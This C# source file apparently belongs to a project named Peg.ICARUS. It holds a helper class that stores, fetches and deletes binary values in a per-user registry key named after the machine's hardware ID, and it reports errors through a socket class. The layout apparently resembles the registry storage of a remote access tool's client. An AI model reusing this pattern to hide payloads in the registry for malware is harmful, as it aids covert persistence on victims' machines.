using System;
using Microsoft.Win32;

namespace Peg.ICARUS
{
    public static class SetRegistry
    {
        private static readonly string ID = @"Software\" + Settings.Hw_id;

        public static bool SetValue(string name, byte[] value)
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    key.SetValue(name, value, RegistryValueKind.Binary);
                    return true;
                }
            }
            catch (Exception ex)
            {
                PegSock.Error(ex.Message);
            }

            return false;
        }

        public static byte[] GetValue(string value)
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(ID))
                {
                    var o = key.GetValue(value);
                    return (byte[])o;
                }
            }
            catch (Exception ex)
            {
                PegSock.Error(ex.Message);
            }

            return null;
        }

        public static bool DeleteValue(string name)
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(ID))
                {
                    key.DeleteValue(name);
                    return true;
                }
            }
            catch (Exception ex)
            {
                PegSock.Error(ex.Message);
            }

            return false;
        }

        public static bool DeleteSubKey()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey("", true))
                {
                    key.DeleteSubKeyTree(ID);
                    return true;
                }
            }
            catch (Exception ex)
            {
                PegSock.Error(ex.Message);
            }

            return false;
        }
    }
}